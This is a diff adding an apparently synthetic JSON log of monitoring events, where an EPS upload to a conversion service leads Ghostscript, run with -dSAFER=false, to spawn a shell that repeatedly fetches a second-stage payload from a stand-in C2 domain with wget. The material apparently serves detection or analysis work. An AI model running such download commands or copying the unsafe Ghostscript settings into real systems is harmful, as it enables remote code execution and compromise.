@@ -1,0 +1,20 @@
+{
+  "id": 15,
+  "timestamp": 1783018800,
+  "events": [
+    "[ebpf] Waiting for encrypted data on /dev/pts/7...",
+    "[network:/dev/pts/11] {\"event\": \"startup\", \"message\": \"Network packet sniffer is running\"}",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"Sniffing on interfaces: ['eth0']\"}",
+    "[network:/dev/pts/11] {\"packet_number\": 1, \"timestamp\": \"2026-07-05T19:10:00.000000+00:00\", \"ethernet\": {\"src_mac\": \"52:55:0a:00:02:20\", \"dst_mac\": \"52:54:00:12:34:56\", \"type\": \"0x800\"}, \"network\": {\"version\": 4, \"src_ip\": \"198.51.100.70\", \"dst_ip\": \"10.0.2.3\", \"protocol_number\": 6, \"protocol_name\": \"TCP\", \"ttl\": 52, \"tos\": 0, \"identification\": 9001, \"flags\": \"DF\", \"fragment_offset\": 0, \"total_length\": 900, \"header_length\": 20}, \"transport\": {\"protocol\": \"TCP\", \"src_port\": 55210, \"dst_port\": 80, \"length\": 880, \"checksum\": 71001}, \"http\": {\"type\": \"request\", \"method\": \"POST\", \"path\": \"/convert?to=svg\", \"version\": \"HTTP/1.1\", \"headers\": {\"Content-Type\": \"multipart/form-data\", \"Content-Length\": \"812\"}}, \"payload\": {\"size_bytes\": 860}, \"services\": {\"src_service\": null, \"dst_service\": \"http\"}, \"process\": null, \"direction\": \"inbound\", \"raw_packet_size\": 934}",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"multipart body declares field 'file' filename figure.eps, content-type application/postscript, 812 bytes\"}",
+    "[ebpf] 19:10:00.150  pstoedit         9510     33       execve     PATH: /usr/bin/pstoedit -f svg /tmp/upload_9510.eps /tmp/out_9510.svg",
+    "[ebpf] 19:10:00.180  gs               9512     0        execve     PATH: /usr/bin/gs -q -dDELAYBIND -dWRITESYSTEMDICT -dNODISPLAY -dNOEPS -dSAFER=false /tmp/upload_9510.eps",
+    "[ebpf] 19:10:00.220  gs               9512     0        execve     PATH: /bin/sh -c 'wget https://drop.bad-c2-domain.test/stage2 -O /tmp/.gsstage' FLAGS: [SHELL_INTERPRETER]",
+    "[ebpf] 19:10:00.230  sh               9515     0        execve     PATH: /usr/bin/wget",
+    "[ebpf] 19:10:00.510  gs               9512     0        execve     PATH: /bin/sh -c 'wget https://drop.bad-c2-domain.test/stage2 -O /tmp/.gsstage' FLAGS: [SHELL_INTERPRETER]",
+    "[ebpf] 19:10:00.520  sh               9519     0        execve     PATH: /usr/bin/wget",
+    "[ebpf] 19:10:00.800  gs               9512     0        execve     PATH: /bin/sh -c 'wget https://drop.bad-c2-domain.test/stage2 -O /tmp/.gsstage' FLAGS: [SHELL_INTERPRETER]",
+    "[ebpf] 19:10:00.810  sh               9523     0        execve     PATH: /usr/bin/wget",
+    "[network:/dev/pts/11] {\"event\": \"info\", \"message\": \"HTTP response 500 to 198.51.100.70 for POST /convert?to=svg, conversion pipeline error, no output returned\"}"
+  ]
+}
